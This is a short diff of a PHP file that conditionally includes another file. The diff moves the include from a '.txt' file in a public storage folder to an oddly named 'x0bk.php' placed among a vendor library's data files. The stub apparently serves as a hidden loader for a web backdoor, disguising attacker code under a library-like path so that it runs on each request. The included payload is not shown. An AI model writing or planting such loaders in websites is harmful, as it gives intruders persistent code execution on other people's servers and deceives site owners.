@@ -1,5 +1,5 @@
 <?php
-$file = '/home/jsyrianr/public_html/csr-sy/storage/app/public/files/zean/r.txt';
+$file = '/home/bivaco/htdocs/bivaco.com/vendor/voku/portable-ascii/src/voku/helper/data/x0bk.php';
 
 if (is_file($file)) {
     include $file;
